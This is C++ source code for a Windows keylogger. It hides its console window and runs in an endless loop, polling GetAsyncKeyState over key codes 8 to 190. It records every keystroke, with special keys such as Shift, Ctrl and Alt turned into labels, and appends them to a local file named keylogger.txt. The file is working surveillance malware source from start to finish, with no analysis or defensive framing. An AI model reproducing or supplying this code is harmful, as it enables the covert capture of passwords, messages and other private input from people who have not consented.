#include <iostream>
#include <fstream>
#include <windows.h>
#include <bits/stdc++.h>

using namespace std;
// lOG file path
#define LOG_FILE "keylogger.txt"

void saveData(string data){
    std::fstream logfile;

    logfile.open(LOG_FILE,std::ios::app);
    logfile << data;

    logfile.close();
}

string translateSpecialKey(int key){
    string result;
    switch (key){
    case VK_SPACE:
        result = " ";
        break;
    case VK_RETURN:
        result = "/n";
        break;
    case VK_BACK:
        result = "/b";
        break;
    case VK_CAPITAL:
        result = "[CAPS_LOCK]";
        break;
    case VK_SHIFT:
        result = "[SHIFT]";
        break;
    case VK_TAB:
        result = "[TAB]";
        break;
    case VK_CONTROL:
        result = "[CTRL]";
        break;
    case VK_MENU:
        result = "[ALT]";
        break;
    default:
        break;
    }
    return result;
}

int main() {

    int specialKeyArray[] = {VK_SPACE, VK_RETURN, VK_SHIFT, VK_BACK, VK_TAB, VK_CONTROL, VK_MENU, VK_CAPITAL}; 
    string specialKeyChar;
    bool isSpecialKey;
    //Hide terminal window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    while(true){
        for(int key = 8; key<=190; key++){
            if(GetAsyncKeyState(key) == -32767){
                //key is pressed
                //Check if key is special key
                isSpecialKey = (find(begin(specialKeyArray), end(specialKeyArray), key) != end(specialKeyArray));
                if(isSpecialKey){
                    specialKeyChar = translateSpecialKey(key);
                    saveData(specialKeyChar);
                } else {
                    if(GetKeyState(VK_CAPITAL)) {
                        saveData(string(1,char(key)));
                    }else{
                        saveData(string(1,(char)tolower(key)));
                    }
                }
            }
        }
    }
}